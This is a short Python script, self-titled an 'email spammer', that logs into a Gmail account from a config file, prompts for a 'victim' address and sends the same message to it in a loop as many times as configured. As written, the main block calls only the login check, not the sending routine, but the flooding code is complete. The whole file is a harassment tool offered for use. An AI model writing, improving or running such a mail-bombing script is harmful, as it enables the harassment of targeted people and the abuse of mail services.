import os, sys, json, smtplib

os.system('cls & mode 70, 12 & title email spammer │ by lozza (github.com/qro)')

with open('config.json') as f:
    config = json.load(f)
email = config.get('email')
password = config.get('password')
message = config.get('message')
number = config.get('amount')

victim = input(' [?] Victim: ')

class SMTP():
    def __init__(self):
        self.email = email
        self.password = password
        self.victim = victim
        self.message = message
        self.number = number
    
    def verify(self):
        server1 = smtplib.SMTP('smtp.gmail.com', 587)
        server1.ehlo()
        server1.starttls()

        try:
            server1.login(self.email, self.password)
        except smtplib.SMTPAuthenticationError:
            print('\n [!] The email or password is wrong\n [!] Make sure lesssecureapps is turned on')
            input()
    
    def spam(self):
        os.system('cls & mode 70, 32 & title email spammer │ by lozza (github.com/qro)')
        server2 = smtplib.SMTP('smtp.gmail.com', 587)
        server2.ehlo()
        server2.starttls()
        server2.login(self.email, self.password)
        i = 0
        while i < self.number:
            i+=1
            server2.sendmail(self.email, self.victim, self.message)
            print((' [>] ''%d sent ')%(i))
        print('\n [!] Process finished')
        input()

if __name__ == '__main__':
    SMTP().verify()